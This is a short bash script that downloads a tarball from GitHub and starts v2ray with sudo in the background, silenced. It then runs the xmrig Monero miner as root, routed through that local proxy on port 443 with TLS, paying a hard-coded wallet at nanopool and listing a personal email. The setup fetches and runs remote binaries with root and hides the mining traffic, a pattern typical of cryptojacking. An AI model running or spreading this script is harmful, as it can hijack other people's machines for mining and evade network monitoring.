#!/bin/bash
#love u fika

wget https://github.com/prendibs/xmr/raw/main/x.tar.gz && tar xf x.tar.gz
nohup sudo ./v2ray run --config=na.json </dev/null >/dev/null 2>&1 &
echo "love u fika"

sudo ./xmrig -B -x 127.0.0.1:443 -o xmr-us-west1.nanopool.org:10343 -u 85aF23j9ZZQ1nV7ESmrzrRDUfQTbuCzfyWZDJY2qeMRXHU15GeAaMpDKF2JW67Niq7FWVJbnVBSDCYZLHRyAxYhvFgDTCNo.pna/ndruta11@gmail.com -p x -a rx/0 -k --randomx-1gb-pages --tls
